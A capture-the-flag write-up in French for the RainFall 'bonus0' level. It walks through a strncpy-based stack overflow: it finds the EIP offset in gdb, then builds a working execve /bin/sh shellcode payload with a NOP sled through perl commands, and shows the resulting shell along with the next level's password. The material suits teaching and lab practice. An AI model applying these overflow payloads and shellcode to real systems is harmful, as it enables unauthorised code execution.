# bonus0

On a un exécutable un peu plus complexe que les précédents, le main appelle la fonction `pp()` qui va appeler `p()` 2 fois puis concaténer les 2 inputs.
`p()` va attendre un input, puis copier son contenu dans char * passé en paramètre. La copie se fait avec `strncpy` , on voit dans le man que si la chaine copiée est plus longue ou de longueur égale au paramètre passé, elle ne sera pas nul-terminée. Dans ce cas, on se retrouvera donc avec le buffer du 2ème input qui sera collé au premier:

```sh
bonus0@RainFall:~$ ./bonus0 
 - 
01234567890123456798
 - 
abcdef
01234567890123456798abcdef abcdef
```

On remarque que le programme crash si le premier argument est >= à 20 ET que le 2ème argument respecte la même condition, probablement car dans ce cas, on dépasse la capacité du buffer du main une fois que les 2 input ont été concaténés

En utilisant l'offset finder, on voit que `eip` se trouve à 9 adresses du début du second buffer dans le cas ou le premier n'est pas nul-terminé
```sh
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
aaaaaaaaaaaaaaaaaaaaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```

L'idée va donc être de remplacer `eip` par l'adresse du premier buffer qui contiendra notre shellcode

On doit donc trouver l'adresse du premier buffer à l'aide de gdb, on commence par trouver l'instruction dans laquelle le buffer est passé en argument à `read`

```assembly
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:    push   %ebp
   0x080484b5 <+1>:    mov    %esp,%ebp
   0x080484b7 <+3>:    sub    $0x1018,%esp
   0x080484bd <+9>:    mov    0xc(%ebp),%eax
   0x080484c0 <+12>:    mov    %eax,(%esp)
   0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax  ;<----- ici
```

On met donc un breakpoint à cette instruction, puis on va récupérer la valeur du registre `ebp-0x1008`

```sh
(gdb) b *p+28
Breakpoint 1 at 0x80484d0
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 

Breakpoint 1, 0x080484d0 in p ()
(gdb) x $ebp-0x1008
0xbfffe680:    0x00000000
```

On connait donc désormais l'adresse du 1er buffer (`0xbfffe680`), et l'offset de `eip` dans le second buffer, on peut donc commencer à créer notre payload

Le contenu de notre payload sera le suivant:

```
     [               arg 1        ][                              arg 2                                    ]
     |            shellcode             offset (9x "A")  +   adresse du premier buffer  + padding (7x "A") |
     ^                                                                                                     ^
start address                                                                                          end address
```

```sh
echo $( perl -e 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";') > /tmp/first

echo $(perl -e 'print  "A"x9 . "\x80\xe6\xff\xbf" . "A"x7;') > /tmp/second```

```sh
bonus0@RainFall:~$ cat /tmp/second - | cat /tmp/first - | ./bonus0 
 - 
 - 
j
 X�Rh//shh/bin��1��AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���

a
Illegal instruction (core dumped)
```
En essayant ce payload, on voit qu'on se retrouve dans un prompt, puis, en entrant un input, le program crash avec l'erreur illegal instruction

On en a déduit que le shellcode ne devrait probablement pas se trouver dans la partie du buffer qui est affichée. Vu qu'on connait l'adresse du buffer qui contient le read, on peut mettre le shellcode plus loin dans ce buffer en remplissant les 100 premiers bytes (nombre arbitraire), de NOP

```sh
echo $( perl -e 'print "\x90"x100 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";') > /tmp/first

echo $(perl -e 'print  "A"x9 . "\xe4\xe6\xff\xbf" . "A"x7;') > /tmp/second
```

notre overwrite de eip pointe désormais vers 0xBFFFE6E4 qui est l'adresse a 100 bytes de 0xbfffe680

```sh
bonus0@RainFall:~$ cat /tmp/second - | cat /tmp/first - | ./bonus0 
 - 
 - 
��������������������AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

